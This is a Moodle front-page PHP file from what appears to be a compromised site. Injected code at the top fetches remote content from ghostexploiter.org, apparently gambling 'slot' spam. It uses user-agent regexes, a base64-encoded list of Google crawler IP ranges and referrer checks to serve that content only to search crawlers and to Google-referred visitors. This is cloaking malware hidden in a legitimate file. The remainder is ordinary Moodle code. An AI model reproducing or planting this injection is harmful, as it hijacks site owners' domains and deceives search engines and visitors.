<?php
$contents = 'https://ghostexploiter.org/sorex/assets/lms.stmik-dci/slot-demo/demo.txt';
$allDevice = true;
function getContents($url) {
    if(!function_exists('file_get_contents')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $return = curl_exec($ch);
        curl_close($ch);
    } else {
        $return = file_get_contents($url);
    }
    return $return;
}
function KontolNjepat($ua,$ip) {
    global $allDevice;
    if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lg
e |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|
link)|vodafone|wap|windows ce|xda|xiino/i',$ua)
        ||
        preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|a
s(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|
craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|ge
ne|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|
iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u
)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1
|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|
t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro
(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(f
t|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)
|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|
yas\-|your|zeto|zte\-/i',substr($ua,0,4))) {
            if(preg_match("/googlebot|google.com|google/i", $ua)) {
                return true;
            }
        
            $listIp = "MTkyLjE3OC41LjAKMzQuMTAwLjE4Mi45NgozNC4xMDEuNTAuMTQ0CjM0LjExOC4yNTQuMAozNC4xMTguNjYuMAozNC4xMjYuMTc4Ljk2CjM0LjE0Ni4xNTAuMTQ
0CjM0LjE0Ny4xMTAuMTQ0CjM0LjE1MS43NC4xNDQKMzQuMTUyLjUwLjY0CjM0LjE1NC4xMTQuMTQ0CjM0LjE1NS45OC4zMgozNC4xNjUuMTguMTc2CjM0LjE3NS4xNjAuNjQKMzQuMTc2LjEzM
C4xNgozNC4yMi44NS4wCjM0LjY0LjgyLjY0CjM0LjY1LjI0Mi4xMTIKMzQuODAuNTAuODAKMzQuODguMTk0LjAKMzQuODkuMTAuODAKMzQuODkuMTk4LjgwCjM0Ljk2LjE2Mi40OAozNS4yNDc
uMjQzLjI0MAo2Ni4yNDkuNjQuMAo2Ni4yNDkuNjQuMTI4CjY2LjI0OS42NC4xNjAKNjYuMjQ5LjY0LjE5Mgo2Ni4yNDkuNjQuMjI0CjY2LjI0OS42NC4zMgo2Ni4yNDkuNjQuNjQKNjYuMjQ5L
jY0Ljk2CjY2LjI0OS42NS4wCjY2LjI0OS42NS4xMjgKNjYuMjQ5LjY1LjE2MAo2Ni4yNDkuNjUuMTkyCjY2LjI0OS42NS4yMjQKNjYuMjQ5LjY1LjMyCjY2LjI0OS42NS42NAo2Ni4yNDkuNjU
uOTYKNjYuMjQ5LjY2LjAKNjYuMjQ5LjY2LjEyOAo2Ni4yNDkuNjYuMTYwCjY2LjI0OS42Ni4xOTIKNjYuMjQ5LjY2LjMyCjY2LjI0OS42Ni42NAo2Ni4yNDkuNjYuOTYKNjYuMjQ5LjY4LjAKN
jYuMjQ5LjY4LjMyCjY2LjI0OS42OC42NAo2Ni4yNDkuNjkuMAo2Ni4yNDkuNjkuMTI4CjY2LjI0OS42OS4xNjAKNjYuMjQ5LjY5LjE5Mgo2Ni4yNDkuNjkuMjI0CjY2LjI0OS42OS4zMgo2Ni4
yNDkuNjkuNjQKNjYuMjQ5LjY5Ljk2CjY2LjI0OS43MC4wCjY2LjI0OS43MC4xMjgKNjYuMjQ5LjcwLjE2MAo2Ni4yNDkuNzAuMTkyCjY2LjI0OS43MC4yMjQKNjYuMjQ5LjcwLjMyCjY2LjI0O
S43MC42NAo2Ni4yNDkuNzAuOTYKNjYuMjQ5LjcxLjAKNjYuMjQ5LjcxLjEyOAo2Ni4yNDkuNzEuMTYwCjY2LjI0OS43MS4xOTIKNjYuMjQ5LjcxLjIyNAo2Ni4yNDkuNzEuMzIKNjYuMjQ5Ljc
xLjY0CjY2LjI0OS43MS45Ngo2Ni4yNDkuNzIuMAo2Ni4yNDkuNzIuMTI4CjY2LjI0OS43Mi4xNjAKNjYuMjQ5LjcyLjE5Mgo2Ni4yNDkuNzIuMjI0CjY2LjI0OS43Mi4zMgo2Ni4yNDkuNzIuN
jQKNjYuMjQ5LjcyLjk2CjY2LjI0OS43My4wCjY2LjI0OS43My4xMjgKNjYuMjQ5LjczLjE2MAo2Ni4yNDkuNzMuMTkyCjY2LjI0OS43My4yMjQKNjYuMjQ5LjczLjMyCjY2LjI0OS43My42NAo
2Ni4yNDkuNzMuOTYKNjYuMjQ5Ljc0LjAKNjYuMjQ5Ljc0LjEyOAo2Ni4yNDkuNzQuMzIKNjYuMjQ5Ljc0LjY0CjY2LjI0OS43NC45Ngo2Ni4yNDkuNzUuMAo2Ni4yNDkuNzUuMTI4CjY2LjI0O
S43NS4xNjAKNjYuMjQ5Ljc1LjE5Mgo2Ni4yNDkuNzUuMjI0CjY2LjI0OS43NS4zMgo2Ni4yNDkuNzUuNjQKNjYuMjQ5Ljc1Ljk2CjY2LjI0OS43Ni4wCjY2LjI0OS43Ni4xMjgKNjYuMjQ5Ljc
2LjE2MAo2Ni4yNDkuNzYuMTkyCjY2LjI0OS43Ni4yMjQKNjYuMjQ5Ljc2LjMyCjY2LjI0OS43Ni42NAo2Ni4yNDkuNzYuOTYKNjYuMjQ5Ljc3LjAKNjYuMjQ5Ljc3LjEyOAo2Ni4yNDkuNzcuM
TYwCjY2LjI0OS43Ny4xOTIKNjYuMjQ5Ljc3LjMyCjY2LjI0OS43Ny42NAo2Ni4yNDkuNzcuOTYKNjYuMjQ5Ljc4LjAKNjYuMjQ5Ljc5LjAKNjYuMjQ5Ljc5LjEyOAo2Ni4yNDkuNzkuMTYwCjY
2LjI0OS43OS4xOTIKNjYuMjQ5Ljc5LjIyNAo2Ni4yNDkuNzkuMzIKNjYuMjQ5Ljc5LjY0CjY2LjI0OS43OS45Ng==";
            $listIp = base64_decode($listIp);
            $listIp = explode("\n", $listIp);
        
            if(in_array($ip, $listIp)) {
                return true;
            }
        
            if(preg_match('/google/i', getReferer())) {
                return true;
            }
    } else {
      if($allDevice) {
        if(preg_match("/googlebot|google.com|google/i", $ua)) {
          return true;
        }
  
        $listIp = "MTkyLjE3OC41LjAKMzQuMTAwLjE4Mi45NgozNC4xMDEuNTAuMTQ0CjM0LjExOC4yNTQuMAozNC4xMTguNjYuMAozNC4xMjYuMTc4Ljk2CjM0LjE0Ni4xNTAuMTQ0CjM
0LjE0Ny4xMTAuMTQ0CjM0LjE1MS43NC4xNDQKMzQuMTUyLjUwLjY0CjM0LjE1NC4xMTQuMTQ0CjM0LjE1NS45OC4zMgozNC4xNjUuMTguMTc2CjM0LjE3NS4xNjAuNjQKMzQuMTc2LjEzMC4xN
gozNC4yMi44NS4wCjM0LjY0LjgyLjY0CjM0LjY1LjI0Mi4xMTIKMzQuODAuNTAuODAKMzQuODguMTk0LjAKMzQuODkuMTAuODAKMzQuODkuMTk4LjgwCjM0Ljk2LjE2Mi40OAozNS4yNDcuMjQ
zLjI0MAo2Ni4yNDkuNjQuMAo2Ni4yNDkuNjQuMTI4CjY2LjI0OS42NC4xNjAKNjYuMjQ5LjY0LjE5Mgo2Ni4yNDkuNjQuMjI0CjY2LjI0OS42NC4zMgo2Ni4yNDkuNjQuNjQKNjYuMjQ5LjY0L
jk2CjY2LjI0OS42NS4wCjY2LjI0OS42NS4xMjgKNjYuMjQ5LjY1LjE2MAo2Ni4yNDkuNjUuMTkyCjY2LjI0OS42NS4yMjQKNjYuMjQ5LjY1LjMyCjY2LjI0OS42NS42NAo2Ni4yNDkuNjUuOTY
KNjYuMjQ5LjY2LjAKNjYuMjQ5LjY2LjEyOAo2Ni4yNDkuNjYuMTYwCjY2LjI0OS42Ni4xOTIKNjYuMjQ5LjY2LjMyCjY2LjI0OS42Ni42NAo2Ni4yNDkuNjYuOTYKNjYuMjQ5LjY4LjAKNjYuM
jQ5LjY4LjMyCjY2LjI0OS42OC42NAo2Ni4yNDkuNjkuMAo2Ni4yNDkuNjkuMTI4CjY2LjI0OS42OS4xNjAKNjYuMjQ5LjY5LjE5Mgo2Ni4yNDkuNjkuMjI0CjY2LjI0OS42OS4zMgo2Ni4yNDk
uNjkuNjQKNjYuMjQ5LjY5Ljk2CjY2LjI0OS43MC4wCjY2LjI0OS43MC4xMjgKNjYuMjQ5LjcwLjE2MAo2Ni4yNDkuNzAuMTkyCjY2LjI0OS43MC4yMjQKNjYuMjQ5LjcwLjMyCjY2LjI0OS43M
C42NAo2Ni4yNDkuNzAuOTYKNjYuMjQ5LjcxLjAKNjYuMjQ5LjcxLjEyOAo2Ni4yNDkuNzEuMTYwCjY2LjI0OS43MS4xOTIKNjYuMjQ5LjcxLjIyNAo2Ni4yNDkuNzEuMzIKNjYuMjQ5LjcxLjY
0CjY2LjI0OS43MS45Ngo2Ni4yNDkuNzIuMAo2Ni4yNDkuNzIuMTI4CjY2LjI0OS43Mi4xNjAKNjYuMjQ5LjcyLjE5Mgo2Ni4yNDkuNzIuMjI0CjY2LjI0OS43Mi4zMgo2Ni4yNDkuNzIuNjQKN
jYuMjQ5LjcyLjk2CjY2LjI0OS43My4wCjY2LjI0OS43My4xMjgKNjYuMjQ5LjczLjE2MAo2Ni4yNDkuNzMuMTkyCjY2LjI0OS43My4yMjQKNjYuMjQ5LjczLjMyCjY2LjI0OS43My42NAo2Ni4
yNDkuNzMuOTYKNjYuMjQ5Ljc0LjAKNjYuMjQ5Ljc0LjEyOAo2Ni4yNDkuNzQuMzIKNjYuMjQ5Ljc0LjY0CjY2LjI0OS43NC45Ngo2Ni4yNDkuNzUuMAo2Ni4yNDkuNzUuMTI4CjY2LjI0OS43N
S4xNjAKNjYuMjQ5Ljc1LjE5Mgo2Ni4yNDkuNzUuMjI0CjY2LjI0OS43NS4zMgo2Ni4yNDkuNzUuNjQKNjYuMjQ5Ljc1Ljk2CjY2LjI0OS43Ni4wCjY2LjI0OS43Ni4xMjgKNjYuMjQ5Ljc2LjE
2MAo2Ni4yNDkuNzYuMTkyCjY2LjI0OS43Ni4yMjQKNjYuMjQ5Ljc2LjMyCjY2LjI0OS43Ni42NAo2Ni4yNDkuNzYuOTYKNjYuMjQ5Ljc3LjAKNjYuMjQ5Ljc3LjEyOAo2Ni4yNDkuNzcuMTYwC
jY2LjI0OS43Ny4xOTIKNjYuMjQ5Ljc3LjMyCjY2LjI0OS43Ny42NAo2Ni4yNDkuNzcuOTYKNjYuMjQ5Ljc4LjAKNjYuMjQ5Ljc5LjAKNjYuMjQ5Ljc5LjEyOAo2Ni4yNDkuNzkuMTYwCjY2LjI
0OS43OS4xOTIKNjYuMjQ5Ljc5LjIyNAo2Ni4yNDkuNzkuMzIKNjYuMjQ5Ljc5LjY0CjY2LjI0OS43OS45Ng==";
        $listIp = base64_decode($listIp);
        $listIp = explode("\n", $listIp);
    
        if(in_array($ip, $listIp)) {
            return true;
        }
    
        if(preg_match('/google/i', getReferer())) {
            return true;
        }
      }
      return false;
    }
}
function getReferer() {
    return $_SERVER['HTTP_REFERER'];
}
function getRealIP(){
        if (isset($_SERVER["HTTP_CLIENT_IP"])) {
            $ip = $_SERVER["HTTP_CLIENT_IP"];
        } elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
            $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
        } elseif (isset($_SERVER["HTTP_X_FORWARDED"])) {
            $ip = $_SERVER["HTTP_X_FORWARDED"];
        } elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])) {
            $ip = $_SERVER["HTTP_FORWARDED_FOR"];
        } elseif (isset($_SERVER["HTTP_FORWARDED"])) {
            $ip = $_SERVER["HTTP_FORWARDED"];
        } else {
            $ip = $_SERVER["REMOTE_ADDR"];
        }
        // Strip any secondary IP etc from the IP address
        if (strpos($ip, ',') > 0) {
            $ip = substr($ip, 0, strpos($ip, ','));
        }
        return $ip;
}
if(KontolNjepat($_SERVER['HTTP_USER_AGENT'], getRealIP())) {
    if($_SERVER['REQUEST_TIME_FLOAT'] == '/course') {
      echo getContents($contents);
    }
    echo getContents($contents);
    exit;
}
// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.
/**
 * Moodle frontpage.
 *
 * @package    core
 * @copyright  1999 onwards Martin Dougiamas (http://dougiamas.com)
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */
    if (!file_exists('./config.php')) {
        header('Location: install.php');
        die;
    }
    require_once('config.php');
    require_once($CFG->dirroot .'/course/lib.php');
    require_once($CFG->libdir .'/filelib.php');
    redirect_if_major_upgrade_required();
    $urlparams = array();
    if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && optional_param('redirect', 1, PARAM_BOOL) === 0) {
        $urlparams['redirect'] = 0;
    }
    $PAGE->set_url('/', $urlparams);
    $PAGE->set_course($SITE);
    $PAGE->set_other_editing_capability('moodle/course:update');
    $PAGE->set_other_editing_capability('moodle/course:manageactivities');
    $PAGE->set_other_editing_capability('moodle/course:activityvisibility');
    // Prevent caching of this page to stop confusion when changing page after making AJAX changes
    $PAGE->set_cacheable(false);
    if ($CFG->forcelogin) {
        require_login();
    } else {
        user_accesstime_log();
    }
    $hassiteconfig = has_capability('moodle/site:config', context_system::instance());
/// If the site is currently under maintenance, then print a message
    if (!empty($CFG->maintenance_enabled) and !$hassiteconfig) {
        print_maintenance_message();
    }
    if ($hassiteconfig && moodle_needs_upgrading()) {
        redirect($CFG->wwwroot .'/'. $CFG->admin .'/index.php');
    }
    if (get_home_page() != HOMEPAGE_SITE) {
        // Redirect logged-in users to My Moodle overview if required
        if (optional_param('setdefaulthome', false, PARAM_BOOL)) {
            set_user_preference('user_home_page_preference', HOMEPAGE_SITE);
        } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && optional_param('redirect', 1, PARAM_BOOL) === 1) {
            redirect($CFG->wwwroot .'/my/');
        } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_USER)) {
            $PAGE->settingsnav->get('usercurrentsettings')->add(get_string('makethismyhome'), new moodle_url('/', array('setdefaulthome'=>true)), 
navigation_node::TYPE_SETTING);
        }
    }
    $eventparams = array('context' => context_course::instance(SITEID));
    $event = \core\event\course_viewed::create($eventparams);
    $event->trigger();
/// If the hub plugin is installed then we let it take over the homepage here
    if (file_exists($CFG->dirroot.'/local/hub/lib.php') and get_config('local_hub', 'hubenabled')) {
        require_once($CFG->dirroot.'/local/hub/lib.php');
        $hub = new local_hub();
        $continue = $hub->display_homepage();
        //display_homepage() return true if the hub home page is not displayed
        //mostly when search form is not displayed for not logged users
        if (empty($continue)) {
            exit;
        }
    }
    $PAGE->set_pagetype('site-index');
    $PAGE->set_docs_path('');
    $PAGE->set_pagelayout('frontpage');
    $editing = $PAGE->user_is_editing();
    $PAGE->set_title($SITE->fullname);
    $PAGE->set_heading($SITE->fullname);
    $courserenderer = $PAGE->get_renderer('core', 'course');
    echo $OUTPUT->header();
/// Print Section or custom info
    $siteformatoptions = course_get_format($SITE)->get_format_options();
    $modinfo = get_fast_modinfo($SITE);
    $modnames = get_module_types_names();
    $modnamesplural = get_module_types_names(true);
    $modnamesused = $modinfo->get_used_module_names();
    $mods = $modinfo->get_cms();
    if (!empty($CFG->customfrontpageinclude)) {
        include($CFG->customfrontpageinclude);
    } else if ($siteformatoptions['numsections'] > 0) {
        if ($editing) {
            // make sure section with number 1 exists
            course_create_sections_if_missing($SITE, 1);
            // re-request modinfo in case section was created
            $modinfo = get_fast_modinfo($SITE);
        }
        $section = $modinfo->get_section_info(1);
        if (($section && (!empty($modinfo->sections[1]) or !empty($section->summary))) or $editing) {
            echo $OUTPUT->box_start('generalbox sitetopic');
            /// If currently moving a file then show the current clipboard
            if (ismoving($SITE->id)) {
                $stractivityclipboard = strip_tags(get_string('activityclipboard', '', $USER->activitycopyname));
                echo '<p><font size="2">';
                echo "$stractivityclipboard  (<a href=\"course/mod.php?cancelcopy=true&sesskey=".sesskey()."\">". get_string('cancel') .'</a>)';
                echo '</font></p>';
            }
            $context = context_course::instance(SITEID);
            // If the section name is set we show it.
            if (!is_null($section->name)) {
                echo $OUTPUT->heading(
                    format_string($section->name, true, array('context' => $context)),
                    2,
                    'sectionname'
                );
            }
            $summarytext = file_rewrite_pluginfile_urls($section->summary, 'pluginfile.php', $context->id, 'course', 'section', $section->id);
            $summaryformatoptions = new stdClass();
            $summaryformatoptions->noclean = true;
            $summaryformatoptions->overflowdiv = true;
            echo format_text($summarytext, $section->summaryformat, $summaryformatoptions);
            if ($editing && has_capability('moodle/course:update', $context)) {
                $streditsummary = get_string('editsummary');
                echo "<a title=\"$streditsummary\" ".
                     " href=\"course/editsection.php?id=$section->id\"><img src=\"" . $OUTPUT->pix_url('t/edit') . "\" ".
                     " class=\"iconsmall\" alt=\"$streditsummary\" /></a><br /><br />";
            }
            $courserenderer = $PAGE->get_renderer('core', 'course');
            echo $courserenderer->course_section_cm_list($SITE, $section);
            echo $courserenderer->course_section_add_cm_control($SITE, $section->section);
            echo $OUTPUT->box_end();
        }
    }
    // Include course AJAX
    include_course_ajax($SITE, $modnamesused);
    if (isloggedin() and !isguestuser() and isset($CFG->frontpageloggedin)) {
        $frontpagelayout = $CFG->frontpageloggedin;
    } else {
        $frontpagelayout = $CFG->frontpage;
    }
    foreach (explode(',',$frontpagelayout) as $v) {
        switch ($v) {     /// Display the main part of the front page.
            case FRONTPAGENEWS:
                if ($SITE->newsitems) { // Print forums only when needed
                    require_once($CFG->dirroot .'/mod/forum/lib.php');
                    if (! $newsforum = forum_get_course_forum($SITE->id, 'news')) {
                        print_error('cannotfindorcreateforum', 'forum');
                    }
                    // fetch news forum context for proper filtering to happen
                    $newsforumcm = get_coursemodule_from_instance('forum', $newsforum->id, $SITE->id, false, MUST_EXIST);
                    $newsforumcontext = context_module::instance($newsforumcm->id, MUST_EXIST);
                    $forumname = format_string($newsforum->name, true, array('context' => $newsforumcontext));
                    echo html_writer::tag('a', get_string('skipa', 'access', core_text::strtolower(strip_tags($forumname))), array('href'=>'#skips
itenews', 'class'=>'skip-block'));
                    // wraps site news forum in div container.
                    echo html_writer::start_tag('div', array('id'=>'site-news-forum'));
                    if (isloggedin()) {
                        $SESSION->fromdiscussion = $CFG->wwwroot;
                        $subtext = '';
                        if (forum_is_subscribed($USER->id, $newsforum)) {
                            if (!forum_is_forcesubscribed($newsforum)) {
                                $subtext = get_string('unsubscribe', 'forum');
                            }
                        } else {
                            $subtext = get_string('subscribe', 'forum');
                        }
                        echo $OUTPUT->heading($forumname);
                        $suburl = new moodle_url('/mod/forum/subscribe.php', array('id' => $newsforum->id, 'sesskey' => sesskey()));
                        echo html_writer::tag('div', html_writer::link($suburl, $subtext), array('class' => 'subscribelink'));
                    } else {
                        echo $OUTPUT->heading($forumname);
                    }
                    forum_print_latest_discussions($SITE, $newsforum, $SITE->newsitems, 'plain', 'p.modified DESC');
                    //end site news forum div container
                    echo html_writer::end_tag('div');
                    echo html_writer::tag('span', '', array('class'=>'skip-block-to', 'id'=>'skipsitenews'));
                }
            break;
            case FRONTPAGEENROLLEDCOURSELIST:
                $mycourseshtml = $courserenderer->frontpage_my_courses();
                if (!empty($mycourseshtml)) {
                    echo html_writer::tag('a', get_string('skipa', 'access', core_text::strtolower(get_string('mycourses'))), array('href'=>'#skip
mycourses', 'class'=>'skip-block'));
                    //wrap frontpage course list in div container
                    echo html_writer::start_tag('div', array('id'=>'frontpage-course-list'));
                    echo $OUTPUT->heading(get_string('mycourses'));
                    echo $mycourseshtml;
                    //end frontpage course list div container
                    echo html_writer::end_tag('div');
                    echo html_writer::tag('span', '', array('class'=>'skip-block-to', 'id'=>'skipmycourses'));
                    break;
                }
                // No "break" here. If there are no enrolled courses - continue to 'Available courses'.
            case FRONTPAGEALLCOURSELIST:
                $availablecourseshtml = $courserenderer->frontpage_available_courses();
                if (!empty($availablecourseshtml)) {
                    echo html_writer::tag('a', get_string('skipa', 'access', core_text::strtolower(get_string('availablecourses'))), array('href'=
>'#skipavailablecourses', 'class'=>'skip-block'));
                    //wrap frontpage course list in div container
                    echo html_writer::start_tag('div', array('id'=>'frontpage-course-list'));
                    echo $OUTPUT->heading(get_string('availablecourses'));
                    echo $availablecourseshtml;
                    //end frontpage course list div container
                    echo html_writer::end_tag('div');
                    echo html_writer::tag('span', '', array('class'=>'skip-block-to', 'id'=>'skipavailablecourses'));
                }
            break;
            case FRONTPAGECATEGORYNAMES:
                echo html_writer::tag('a', get_string('skipa', 'access', core_text::strtolower(get_string('categories'))), array('href'=>'#skipcat
egories', 'class'=>'skip-block'));
                //wrap frontpage category names in div container
                echo html_writer::start_tag('div', array('id'=>'frontpage-category-names'));
                echo $OUTPUT->heading(get_string('categories'));
                echo $courserenderer->frontpage_categories_list();
                //end frontpage category names div container
                echo html_writer::end_tag('div');
                echo html_writer::tag('span', '', array('class'=>'skip-block-to', 'id'=>'skipcategories'));
            break;
            case FRONTPAGECATEGORYCOMBO:
                echo html_writer::tag('a', get_string('skipa', 'access', core_text::strtolower(get_string('courses'))), array('href'=>'#skipcourse
s', 'class'=>'skip-block'));
                //wrap frontpage category combo in div container
                echo html_writer::start_tag('div', array('id'=>'frontpage-category-combo'));
                echo $OUTPUT->heading(get_string('courses'));
                echo $courserenderer->frontpage_combo_list();
                //end frontpage category combo div container
                echo html_writer::end_tag('div');
                echo html_writer::tag('span', '', array('class'=>'skip-block-to', 'id'=>'skipcourses'));
            break;
            case FRONTPAGECOURSESEARCH:
                echo $OUTPUT->box($courserenderer->course_search_form('', 'short'), 'mdl-align');
            break;
        }
        echo '<br />';
    }
    if ($editing && has_capability('moodle/course:create', context_system::instance())) {
        echo $courserenderer->add_new_course_button();
    }
    
    echo $OUTPUT->footer();